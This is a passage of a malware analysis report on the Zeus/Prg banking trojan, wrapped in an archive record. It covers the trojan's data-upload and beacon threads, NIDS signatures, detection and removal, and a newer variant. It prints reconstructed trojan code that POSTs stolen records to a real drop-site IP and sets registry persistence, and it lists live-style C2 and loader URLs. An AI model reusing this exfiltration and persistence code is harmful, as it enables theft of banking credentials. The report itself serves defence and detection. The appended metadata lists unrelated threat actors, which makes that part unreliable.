information\nwritten to audio.dll and formatted as a HALL_RECORD (all described in Stealing Data from HTTP\nRequest Buffers) and POSTs it to the drop site specified in uc.bin as record number 4:\n\nhttp_//72.36.223.62/s.php?1=$1$\n\nThe “$1$” syntax is really just a variable indicator. Once decoded, the URL is parsed and whatever is\nbetween the “$$” characters is replaced by a value. In this case, the value of $1$ will be a quasi-unique\nsystem identification string (composition described in the next section). This tells s.php which directory\nlocation to save the POST data in the payload of the packet. For example, the logs/ directory of a drop\nsite may appear like this:\n\nThe numerical directory names correspond to an octet of the remote IP address. The first three octets are\nused to build a hierarchy this way, meaning the drop site files for infected machines on the same class C\nnetwork will end up in a directory together; although separated by filenames matching the quasi-unique\nstring.\n\nIn order to actually build the HTTP request, the URL from uc.bin’s record is formatted into a\nURL_COMPONENTS structure by calling InternetCrackUrl(). Then, some simple checks are done to\nmake sure the URL is valid. If it has a NULL hostname or is not HTTP or HTTPS, then the upload is not\nattempted. Futhermore, if the URL path (starting at s.php) is not provided, then the upload is POSTed to\n“/”, the drop site’s default page.\n\n\n-----\n\n```\nif (URL_Components.dwHostNameLength == NULL || \n  (URL_Components.nScheme != INTERNET_SCHEME_HTTP) && \n  (URL_Components.nScheme != INTERNET_SCHEME_HTTP))\n{\n    return(false);\n}\nif (URL_Components.dwUrlPathLength = 0) {\n    hRequest = HttpOpenRequestA(hRequest, \"POST\", \"/\", NULL, NULL,\n    NULL, ddFlags, NULL);\n}\nelse {\n    hUpload = HttpOpenRequestA(hRequest, \"POST\", URL_Components.lpszUrlPath, \n    NULL, NULL, NULL, ddFlags, NULL);\n}\nif (HttpSendRequestA(hUpload, \"Content-Type: binary\\r\\n\", 0xFFFFFFFF, \n    databuffer, nRecordLength + 8)) \n{\n    if (CheckServerResponse(hUpload)) {\n        // Clear the input file's data (erase the record)\n        SetFilePointer(hAudioDll, -nRecordLength, NULL, FILE_CURRENT); \n        memset(databuffer, 0, nRecordLength);\n        WriteFile(hAudioDll, databuffer, nRecordLength, \n        &ddNumberOfBytesWritten, NULL);\n        FlushFileBuffers(hAudioDll);\n    }\n}\n\n```\nAs shown, the Content-Type of the upload request will be “binary.” This information was useful in building\nthe Bleeding-Edge NIDS Signatures. The databuffer variable is a heap region filled with the contents\nof audio.dll. After sending the request, the server’s response is checked before erasing the record data.\nTo do this, it calls HttpQueryInfo() with an info level of HTTP_QUERY_CUSTOM. This allows a buffer to\npassed that contains a particular header value from the server’s HTTP reply to be checked. Rather than\nchecking for the normal HTTP 200 (OK) status, the code checks for the “HALL” header and its\ncorresponding value. If the server replied with “HALL: OK”, then the upload was successful.\n\nThis obscurity in communication is great for the NIDS signatures, because it is very uncommon. The\ndetection of a “HALL:” HTTP reply from a server is unlikely to cause false positives, and on the other\nhand, if it ever triggers – this almost definitely indicates an infected client.\n\n\n-----\n\n# 14 Activity Statistics Thread\n\nAside from all the information we already know to be stolen, an important part of malware operation is the\nability to track how many machines have been infected, and where those machines may be located. The\nthird thread launched from svchost.exe decodes record number 5 from uc.bin and uses it build an HTTP\nGET request to the drop site server. The request is sent according to the following format:\n\nhttp_//72.36.223.62/s.php?2=$1$&n=$2$\n\nThis URL is composed of two parameters, 2 and n. The prior is a quasi-unique string identifying the\ninfected machine. The string is produced using the system’s computer name, an underscore separator,\nand the result of a call to GetTickCount(). The later value, n, has only three possible values: 0, 1, and\n2. If the value of n is 0, this indicates a new install of the trojan. If the value is 1, this indicates that it is not\na new install; but rather the trojan is just phoning-home to let the server know it is still active. The value of\n2 indicates that an update of the trojan code has occurred. Data sent to s.php in this manner is inserted\ninto a MySQL database and presented by admin.php.\n\nThe following screen shot shows over 7,000 infected machines; the majority from USA. It shows that 1\nupdate has occurred (this was actually the result of a test sent manually by making n=2). The activity\ncount increases by 1 for each stolen record that is uploaded to the drop site – a task carried out by the\nStolen Data Upload Thread.\n\n\n-----\n\nAs stated before, a goal of this study is not to simply understand what the trojan does; but rather exactly\nhow it does it, including programmatic structure, API calls, and all conditionals. The quasi-unique string\nfor identification is located in a static location in the registry. The code calls GetComputerName() to\nlearn its host name, but uses “unknown” if that function fails; and the hex-dword result from\nGetTickCount() is appended to this string. The existence of this registry key may be used to indicate\ninfection of a system.\n```\nWCHAR g_szRegKeyNetwork[] = L\"software\\\\microsoft\\\\windows\nnt\\\\currentversion\\\\network\";\nif (!GetComputerNameW(wcComputerName, &ddComputerLength)) {\n    lstrcpyW(wcComputerName, L\"unknown\");\n}\nwnsprintfW(wcData, MAX_PATH, L\"%s_%08X\", wcComputerName, GetTickCount());\nif (RegCreateKeyExW(HKEY_CURRENT_USER, g_szRegKeyNetwork, 0, NULL, \n    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hkResult, NULL) ==\n    ERROR_SUCCESS)\n{\n    cbData = (lstrlenW(wcData) + 1) * 2;\n    RegSetValueExW(hkResult, L\"UID\", NULL, REG_SZ, (BYTE *)wcData, cbData);\n    RegCloseKey(hkResult);\n}\n\n```\nThe next interesting piece of information is how the code decides which value to send for n. This also\ninvolves a registry key in HKEY_CURRENT_USER. The exact location is:\n```\nWCHAR g_szRegKeyExplorer[] =\nL\"software\\\\microsoft\\\\windows\\\\currentversion\\\\explorer\";\nunsigned char ucToBeCLSID[] =\n\"\\x02\\xFF\\xAC\\x45\\x0B\\x10\\x56\\x33\\x42\\x96\\x18\\x01\\xF1\\xA3\\x66\\x78\";\n\n```\nThe key name is composed of a byte string in the binary’s global section. This prevents the “strings” tool\nfrom revealing which registry locations are altered by the program. Before using this byte string as the\nCLSID, it is processed by a loop that formats it with brackets and dashes, and stores the result in a\nWCHAR buffer, like this:\n\n{02FFAC45-0B10-5633-4296-1801F1A36678}\n\nThis key’s value type is binary, unlike the UID value which is just a string. Even more so, the binary is\nencoded just like the other data. It seems like quite a bit of trouble to protect something that really is not\nall that sacred. For example, once the key’s value is decoded, it will be a number between 0 and 20. If the\nnumber is 0, this means the CLSID key has never been initialized and thus the install of the trojan is\nbrand new. If the number is between 1-19, this means an update of the trojan has occurred; and the exact\nvalue probably corresponds to the updated version. If the number is 20, this means the trojan is not a new\ninstall; and it sets the value of n in the s.php request accordingly.\n\n\n-----\n\n# 15 Bleeding-Edge NIDS Signatures\n\nBased on the previous information, and some yet to be shared, the following intrusion detection\nsignatures for Bleeding-Edge Threats, [3] can be used to alert when this trojan is active.\n\nA large number of individual signatures can be written for the URLs (e.g. /s.php?1=$1$&n=$2$), but\nremember the URL can be updated at any time by modifying the uc.bin file. These signatures are written\nto cover all three of the versions available for analysis. In order to bypass these signatures, the author\nwould not be able to simply update uc.bin, they would have to change the binary already running on the\nsystem. Although this would be possible, it would be a bit more work.\n\nThe following signature detects when the trojan is uploading a stolen data record to the drop site.\n\nalert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:\"Prg Trojan v0.1-v0.3 Data Upload\";\nflow:to_server,established; content:\"POST\"; uricontent:\"php?\"; content:\"ContentType|3a20|binary\"; within:512; content:”LLAH\"; within:512; classtype:trojan-activity;\nsid:20061110;)\n\nThe following signature detects when the drop site is acknowledging receipt of the stolen data:\n\nalert tcp $EXTERNAL_NET 80 -> $HOME_NET any (msg:\"Prg Trojan Server Reply\";\nflow:to_client,established; content:\"HTTP\"; depth:4; content:\"|0d0a|Hall|3a|\";\nwithin:512; classtype:trojan-activity; sid:20061111;)\n\nThe next three signatures detect the trojan binary is in transit. These signatures are based on the\nencoded URL string in the MS-DOS header. Although the trojan is packed with UPX, these signatures\ncan detect both the packed and unpacked versions; because the byte sequence exists in the MS-DOS\nheader, which is not altered by UPX.\n\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"Prg Trojan v0.1 Binary In Transit\";\nflow:to_client,established; content:\"MZ\"; content:\"|1D B9 F2 75 62 85 5A 4F 15 48 52\n1D 50 90 41 89 37 9F FF 94 CE A6 3E 63 35 AB 29 6B 30 43 2F 45 46 B0 E1 C2 11 7F 0C 55\n0F C7|\"; within:128; classtype:trojan-activity; sid:20061112;)\n\nalert tcp $EXTERNAL_NET any -> $HOME_NET (msg:\"Prg Trojan v0.2 Binary In Transit\";\nflow:to_client,established; content:\"MZ\"; content:\"|13 B9 F2 75 62 85 5A 4F 15 48 19\n1D 10 4F 0D 5B 04 5B 04 60 CE 5F 00 67 F5 AE 25 6B 20 41 23 B3|\"; within:128;\nclasstype:trojan-activity; sid:20061113;)\n\nalert tcp $EXTERNAL_NET any -> $HOME_NET (msg:\"Prg Trojan v0.3 Binary In Transit\";\nflow:to_client,established; content:\"MZ\"; content:\"| 5E 7D 66 7D 28 40 19 88 5F 8C 13\n50 15 59 08 58 3C 97 00 9B 33 A5 F9 AF 39 68 F0 9F 27 AF E9 A8 25 B7 18 B6 15 7F 0E B6\n1A|\"; within:128; classtype:trojan-activity; sid:20061114;)\n\n\n-----\n\n# 16 Trojan Detection and Removal \n\nThere are multiple ways one may check if a system is infected with this malware.\n\nThe changes made to the file system include:\n\n**Type** **Location** **Description**\nFile %SYSTEM%\\ntos.exe Copy of trojan with random byte filling.\nDir %SYSTEM%\\wsnpoem Created with SYSTEM and HIDDEN attributes.\nFile %SYSTEM%\\wsnpoem\\audio.dll Contains stolen data from HTTP request buffer.\nFile %SYSTEM%\\wsnpoem\\video.dll Contains local copy of uc.bin.\n\nThe changes made to the registry include:\n\n**Hive** **Key Location** **Value** **Description**\nHKCU software\\\\microsoft\\\\windows\\\\currentversion\\\\run ntos.exe For auto-run\nHKCU software\\\\microsoft\\\\windows\\\\currentversion\\\\exp Encoded Maintain install\nlorer\\\\{02FFAC45-0B10-5633-4296-1801F1A36678}\nbinary data. status\nHKCU software\\\\microsoft\\\\windows %s_%08X The quasi-unique\nnt\\\\currentversion\\\\network\\\\UID\nid string.\nHKLM software\\\\microsoft\\\\windows Path to For auto-run.\nnt\\\\currentversion\\\\winlogon\\\\userinit\nntos.exe.\n\nThe trojan’s presence on a system can also be detected by examining other areas of memory besides the\nhard disk and registry data. The following table includes details on how to detect the trojan by scanning\nmemory or evaluating the accessibility of certain objects.\n\n**Type** **Name/Data** **Description**\nMutex __SYSTEM__91C38905__ Mutex for trojan run-time.\nMutex __SYSTEM__64AD0625__ Mutex for named pipe access.\nPipe //./pipe/__SYSTEM__64AD0625__ Named pipe address\nMutex __SYSTEM__7F4523E5__ Mutex for Internet handles.\nMutex __SYSTEM__23D80F10__ Mutex for audio.dll handle.\nMutex __SYSTEM__45A2F601__ Mutex for video.dll handle.\n\nInformation on how to obtain a program which scans for this information and reports infection is available\nin the Introduction. The program engages a non-intrusive assessment of the items listed in the tables\nabove and reports their existence. Output from a non-infected system will appear like this:\n\n\n-----\n\nIf during the file system, mutex, and registry scan, the program detects indications of infection, it will move\nforward with process memory checks. The process memory check will scan content at 0x14D00000 of\nsystem processes infected during Mass Process Infection, provided that range is readable. The code will\ncheck if a PE resides in the region and if so, it will decode the data corresponding to the drop site URL\nfound in the MS-DOS header. If the decoded content matches “http”, then the process is infected. This is\nnot a byte-string signature, rather a dynamic one based on this characteristic. This detection method can\nsuccessfully identify all versions of the trojan that were available for analysis.\n\n[****] Prg System Cleaner [****]\n(c) Secure Science Corporation\n\n[!] Found trojan mutex: Pipe Mutex\n\n[!] Found trojan mutex: Internet Mutex\n\n[i] Found 2 mutex objects.\n\n[!] Found HKCU\\software\\microsoft\\windows nt\\currentversion\\network\\UID\n\n[!] Found ntos.exe in HKLM\\software\\microsoft\\windows\nnt\\currentversion\\winlogon\\userinit\n\n[i] Found 2 registry entries.\n\nFound C:\\WINDOWS\\system32\\ntos.exe\nFound match of \"C:\\WINDOWS\\system32\\wsnpoem\\*.dll\": audio.dll\nFound match of \"C:\\WINDOWS\\system32\\wsnpoem\\*.dll\": video.dll\n\n[i] Found 3 files.\n\n[i] Checking process memory...\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in System (pid 4)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in smss.exe (pid 492)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in winlogon.exe (pid 648)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in services.exe (pid 692)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in lsass.exe (pid 704)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in svchost.exe (pid 936)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in svchost.exe (pid 976)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in svchost.exe (pid 1020)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in svchost.exe (pid 1092)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in explorer.exe (pid 1336)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in spoolsv.exe (pid 1420)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in VMwareService.exe (pid 1656)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in VMwareTray.exe (pid 1860)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in VMwareUser.exe (pid 1872)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in ClamTray.exe (pid 1880)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in BHODemon.exe (pid 1936)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in alg.exe (pid 192)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in wscntfy.exe (pid 220)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in wuauclt.exe (pid 1844)\n\n[!] Found \"http://72.36.223.62/uc.bin\" hiding in cmd.exe (pid 1812)\n\nThe detection program does not attempt to clean the system. It will not attempt to close the handle to\nntos.exe from within winlogon.exe. It will also not attempt to free the heap region within infected\nprocesses where the trojan’s image is written. If this is done without terminating any active thread running\nfrom the region, then serious stability problems can occur. Also, even if all threads are terminated and the\nregion is freed, the next time a process tries to call one of the hooked functions, it will end up producing\nan access violation by dereferencing 0x00000000 from the freed heap region.\n\nThere is an easier way to clean the system that does not share the same stability concerns, but is very\neffective. One can use a tool such as Process Explorer, [11] to close winlogon.exe’s handle to ntos.exe.\nThis can be done by using the “Find Handle” function and searching for “ntos.exe.”\n\n\n-----\n\nFrom here, ntos.exe can be deleted; and once the system is rebooted, it will no longer be infected. This is\nbecause after removing ntos.exe from disk, the trojan is only memory resident. The remaining files and\nregistry values identified in the detection program can be removed, however they will not cause harm to\nthe system once the main trojan code is deactivated.\n\nAt the time of this writing, several protection services detect the trojan, but many still do not. The majority\njust detect it as generic malware or back door code. Versions 1 and 2 are nearly identical, having a\ndifferent URL in their header (hence the similar detection patterns). Version 3 is the one described in\nBonus: New Malware, New Avenues and it is significantly different; though undoubtedly written by the\nsame authors.\n\nThe information obtained is from VirusTotal, [10]. All samples scanned were un-packed versions of the\noriginal trojan.\n\n**Engine** **v0.1** **v0.2** **v0.3**\n\nAntiVir [BDS/Small.LU.6] [BDS/Small.LU.6] [HEUR/Crypted]\nAuthentium found nothing found nothing found nothing\nAvast found nothing found nothing found nothing\nAVG [BackDoor.Generic3.RFX] [BackDoor.Generic3.RFX] found nothing\nBitDefender found nothing found nothing Generic.Malware.Sdldg.D57882DF]\nCAT-QuickHeal found nothing found nothing found nothing\nClamAV found nothing found nothing found nothing\nDrWeb [Trojan.Dav] [Trojan.Dav] found nothing\neTrust-InoculateIT found nothing found nothing found nothing\neTrust-Vet found nothing found nothing found nothing\nEwido [Backdoor.Small.lu] [Backdoor.Small.lu] found nothing\nF-Prot found nothing found nothing found nothing\nF-Prot4 found nothing found nothing found nothing\nFortinet [W32/Small.LU!tr.bdr] [suspicious] found nothing\nIkarus found nothing found nothing found nothing\nKaspersky [Backdoor.Win32.Small.lu] [Backdoor.Win32.Small.lu] found nothing\nMcAfee found nothing found nothing found nothing\nMicrosoft found nothing found nothing found nothing\nNOD32v2 found nothing found nothing found nothing\n\n\n-----\n\nNorman [W32/Smalldoor.JLL] [W32/Smalldoor.JLL] found nothing\nPanda found nothing found nothing found nothing\nSophos found nothing found nothing found nothing\nTheHacker [Backdoor/Small.lu] [Backdoor/Small.lu] found nothing\nUNA [Backdoor.Small.F533] [Backdoor.Small.F533] found nothing\nVBA32 [Backdoor.Win32.Small.lu] found nothing found nothing\nVirusBuster found nothing found nothing [Trojan.Agent.FBJ]\n\n\n-----\n\n# 17 Trojan Distribution and Discussions\n\nThis section contains information from user forums and the general community who have come in contact\nwith this trojan.\n\n- Storage Review Forums, [4].\n\nOn October 11, 2006, the Storage Review forums server was compromised using a vulnerability in\nInvision Power Board. Themes in the back end database were modified to include an HTML iframe which\npulled down exploit code from http://zciusfceqg.biz/dl/adv546.php when clients visited the forum. All\nexploit code served by the PHP page is not currently known, but it at least included exploits for the WMF,\nVML, and SetSlice IE vulnerabilities.\n\nAlso interesting in this forum thread is a user’s records of changes to the file system:\n\n_“NTOS.EXE (cleverly dated 8/4/04, haha)”_\n\nThe reason why the date of this file was not consistent with its real creation date is because the trojan\nchanges the file access times. The code gains a handle to ntdll.dll and ntos.exe and then does this:\n```\nGetFileTime(hNtDll, &CreationTime, &LastAccessTime, &LastWriteTime);\nSetFileTime(hNtos, &CreationTime, &LastAccessTime, &LastWriteTime);\n\n```\n- Tech Support Guy Forums, [5].\n\nAlso, on October 11, 2006, A user infected with this trojan made the following comments:\n\n_“but this one is in use so sfp can't copy it C:\\WINDOWS\\system32\\ntos.exe”_\n_“C:\\WINDOWS\\system32\\ntos.exe is still locked by something so couldn't be added to sfp”_\n\nThis is undoubtedly due to the file locking by winlogon.exe, as described in the Named Pipe\nCommunication section.\n\nThe trojan has also been mentioned on Sunbelt Software [6], Spyware Info [7], and Castle Cops [8] web\nsites.\n\n\n-----\n\n# 18 Bonus Section: New Malware, New Avenues \n\nAs this study was nearing its end, a member of CastleCops MIRT, [9] was able to provide a new sample\nof the trojan for analysis. The sample is significantly similar, using the same mutex names and mostly the\nmethodologies for accomplishing its goals. However, some small modifications have been made; and\nsome additional features have been added.\n\nFirst, the trojan no longer uses the LZNT1 compression provided by RtlCompressBuffer() and\nRtlDecompressBuffer(). It now monitors key strokes through the use of GetKeyboardState() and\nGetKeyState(). It captures clipboard data using GetClipboardData() and, based on a list of\nimported functions, appears to be capable of taking screen shots of the desktop using GDI. It now\nmonitors FTP connections and steals the user and password information being sent to the server.\n\nAnother difference is that the drop site has moved again, and the uc.bin file is now called config.dat. It\ncontains different URLs:\n\nhttp://sys1378.3fn.net/zs/.bin/config.dat\n\n2: http://easyglimor.info/loader.exe\n4: http://sys1378.3fn.net/zs/s.php?1=$1$\n5: http://sys1378.3fn.net/zs/s.php?2=$1$&n=$2$&v=$3$&sp=$4$&lcp=$5$&fp=$6$&shp=$7$\n8: http://sys1378.3fn.net/zs/s.php?3=$1$&id=$2$\n3: http://80.93.176.82/~easyglim/zs/config.dat\n7: https://ibank.barclays.co.uk/olb/s/LoginMember.do\n\nThe last major observed difference is that creates two back door threads from svchost.exe that bind to\nsockets and listen for client connections:\n\n\n-----\n\n# 19 References and Tools\n\n[1]. IDA Pro from DataRescue: http://www.datarescue.com/idabase\n\n[2]. Mark Russinovich's Sysinternals Blog (now on Technet), “Running Windows with No Services.”\n\n[3]. Bleeding-Edge Threats: http://www.bleedingthreats.net\n\n[4]. Storage Review Forums: Java start and file download.\n\n[5]. Tech Support Guy Forums: Sister’s Log.\n\n[6]. Sunbelt Software Research Center: Backdoor.Win32.Small.lu.\n\n[7]. Spyware Info (SWI) Forums: Browser severely hijacked…\n\n[8]. CastleCops Forums: Suspected MZU installer ntos.exe…\n\n[9]. CastleCops MIRT: http://www.castlecops.com/c55-MIRT.html\n\n[10]. VirusTotal: http://www.virustotal.com\n\n[11]. Sysinternals Process Explorer for Windows (now on Technet): Process Explorer.\n\n[12]. FlexHex Hex Editor: http://www.flexhex.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.mnin.org/write/ZeusMalware.pdf"
    ],
    "report_names": [
        "ZeusMalware.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041464,
    "ts_creation_date": 1163676601,
    "ts_modification_date": 1163676601,
    "files": {
        "pdf": "https://archive.orkl.eu/4576177c81d3ab9b261533765cf286211282290b.pdf",
        "text": "https://archive.orkl.eu/4576177c81d3ab9b261533765cf286211282290b.txt",
        "img": "https://archive.orkl.eu/4576177c81d3ab9b261533765cf286211282290b.jpg"
    }
}